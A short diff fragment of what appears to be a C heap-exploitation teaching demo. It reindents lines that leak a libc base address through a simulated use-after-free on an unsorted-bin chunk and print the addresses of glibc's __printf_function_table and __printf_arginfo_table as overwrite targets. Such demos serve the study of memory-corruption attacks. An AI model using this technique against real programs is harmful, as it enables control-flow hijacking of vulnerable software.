@@ -81,12 +81,12 @@ int main(void)
   free(p1);
   printf("Free the larger one of the 1st pair --> [p1] (0x%lx, @ %p)\n", p1[-1], p1-2);
 
-    unsigned long libc_base;
+  unsigned long libc_base;
   printf("Now [p1] is in unsorted bin, we can simulate a UAF to leak libc.\n");
-    libc_base = *p1 - MAIN_ARENA - MAIN_ARENA_DELTA;
+  libc_base = *p1 - MAIN_ARENA - MAIN_ARENA_DELTA;
   printf("[+] libc base: 0x%lx\n", libc_base);
-    printf("[+] target __printf_function_table: %p\n", (void *)(libc_base + PRINTF_FUNCTION_T));
-    printf("[+] target __printf_arginfo_table:  %p\n", (void *)(libc_base + PRINTF_ARGINFO_T));
+  printf("[+] target __printf_function_table: %p\n", (void *)(libc_base + PRINTF_FUNCTION_T));
+  printf("[+] target __printf_arginfo_table:  %p\n", (void *)(libc_base + PRINTF_ARGINFO_T));
 
   printf("\n");
 
